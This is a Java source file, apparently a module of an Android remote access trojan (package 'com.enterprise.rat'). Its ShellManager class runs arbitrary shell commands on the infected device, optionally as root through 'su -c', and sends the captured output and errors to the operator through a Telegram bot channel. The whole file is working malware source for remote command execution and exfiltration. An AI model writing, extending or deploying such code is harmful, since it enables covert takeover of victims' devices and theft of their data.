package com.enterprise.rat.commands;

import com.enterprise.rat.utils.TelegramApi;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ShellManager {
    public static void executeCommand(String command) {
        executeShell(command, false);
    }

    public static void executeRootCommand(String command) {
        executeShell(command, true);
    }

    private static void executeShell(String command, boolean asRoot) {
        new Thread(() -> {
            try {
                String[] cmdArray = asRoot ? new String[]{"su", "-c", command} : new String[]{"sh", "-c", command};
                Process process = Runtime.getRuntime().exec(cmdArray);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) output.append(line).append("\n");
                while ((line = errReader.readLine()) != null) output.append("[ERR] ").append(line).append("\n");
                process.waitFor();
                String result = output.toString().trim();
                if (result.isEmpty()) result = "(no output)";
                if (result.length() > 3500) result = result.substring(0, 3500) + "\n...";
                TelegramApi.sendMessage("<b>💻 Shell Output:</b>\n<pre>" + result + "</pre>");
            } catch (Exception e) {
                TelegramApi.sendMessage("❌ Shell Error: " + e.getMessage());
            }
        }).start();
    }
}
